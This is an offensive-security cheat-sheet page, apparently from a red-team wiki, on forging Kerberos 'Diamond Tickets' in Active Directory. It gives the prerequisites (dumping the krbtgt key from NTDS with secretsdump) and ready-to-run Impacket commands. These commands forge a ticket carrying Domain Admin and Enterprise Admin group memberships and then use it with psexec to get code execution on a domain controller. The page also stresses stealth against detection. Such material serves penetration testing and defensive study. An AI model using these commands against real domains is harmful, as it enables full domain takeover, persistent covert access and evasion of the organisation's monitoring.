# 💎 Diamond Ticket

## Theory

A **Diamond Ticket** is a **legitimate TGT** that has been **modified and re-signed** with the **`krbtgt` key**. Unlike a Golden Ticket (fully forged offline), a Diamond Ticket starts from a real TGT issued by the DC, which makes it much harder to detect.

::: details

| Aspect         | Value                                                           |
| -------------- | --------------------------------------------------------------- |
| **Scope**      | Entire domain - same access as a Golden Ticket                  |
| **Key**        | `krbtgt` key (AES256 preferred) - needed to decrypt and re-sign |
| **Lifetime**   | As per domain policy (looks legitimate)                         |
| **Stealth**    | High - TGS requests are preceded by a real AS request           |
| **Use when**   | You have the krbtgt key AND want stealth (Golden is noisy)      |
| **Avoid when** | You don't have the krbtgt key (→ Silver) or need a quick forge  |

:::

**Why it works** - you request a legitimate TGT, decrypt it with the krbtgt key, modify the PAC (user, groups, SIDs), then re-encrypt and re-sign it. The DC accepts it because the signature is valid and the AS-REQ/TGS-REQ flow looks normal.

## Practice

### Requirements

::: details

| Requirement       | How to get it                                     |
| ----------------- | ------------------------------------------------- |
| krbtgt AES256 key | `secretsdump` on NTDS                             |
| Legitimate TGT    | Any low-priv account's TGT (`getTGT`, `tgtdeleg`) |
| Domain SID        | `lookupsid`, `whoami /user`                       |
| Domain FQDN       | Recon, DNS, LDAP                                  |
| Target user / RID | Any existing account, or RID of a privileged one  |

:::

### Forge the Diamond Ticket (Impacket)

```bash
# Request a legitimate TGT for a low-priv user, then modify it
impacket-ticketer -request \
  -domain "$DOMAIN" -user "$LOW_PRIV_USER" -password "$LOW_PRIV_PASS" \
  -nthash "$KRBTGT_NT_HASH" -aesKey "$KRBTGT_AES_KEY" \
  -domain-sid "$DOMAIN_SID" \
  -user-id "$TARGET_RID" \
  -groups "512,513,518,519,520" \
  "$TARGET_USER"
```

> [!warning] Impacket caveat
> As of current versions, Impacket's `ticketer -request` **replaces** the PAC rather than modifying it in place. This is less stealthy than the Rubeus implementation. For better stealth, use Rubeus or Sapphire.

### Use the ticket

```bash
export KRB5CCNAME=$(pwd)/"$TARGET_USER.ccache"
impacket-psexec -k -no-pass "$DOMAIN/$TARGET_USER@$DC_FQDN"
```
